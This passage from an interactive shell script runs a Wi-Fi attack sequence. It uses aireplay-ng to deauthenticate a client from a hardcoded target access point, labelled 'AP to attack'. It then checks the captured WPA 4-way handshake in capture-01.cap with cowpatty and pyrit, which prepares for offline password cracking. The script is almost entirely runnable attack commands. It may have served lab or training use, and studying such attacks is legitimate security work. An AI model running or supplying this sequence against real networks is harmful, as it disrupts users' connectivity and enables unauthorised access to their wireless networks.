echo "<<--- use aireplay-ng to deauthenticate wireless client(s) --->>"
echo "==============================================================="
echo "aireplay-ng -0 1 -a 00:1D:0F:42:B0:0A -c b8:f6:b1:1a:0c:23 mon0"
echo "==============================================================="
# 00:1D:0F:42:B0:0A ---- AP to attack
# b8:f6:b1:1a:0c:23 ---- WLAN card to monitor
aireplay-ng -0 1 -a 00:1D:0F:42:B0:0A -c b8:f6:b1:1a:0c:23 mon0
echo -n "<<--- end of aireplay-ng --->>"
read

echo
echo "<<--- Check the integrity of captured 4-way handshake using cowpatty --->>"
echo "========================================"
echo "	   cowpatty -r capture-01.cap -c"
echo "========================================"
cowpatty -r capture-01.cap -c
echo -n "<<--- end of cowpatty --->>"
read

echo
echo "<<--- Check the integrity of captured 4-way handshake using pyrit --->>"
echo "========================================"
echo "	  pyrit -r capture-01.cap analyze"
echo "========================================"
pyrit -r capture-01.cap analyze
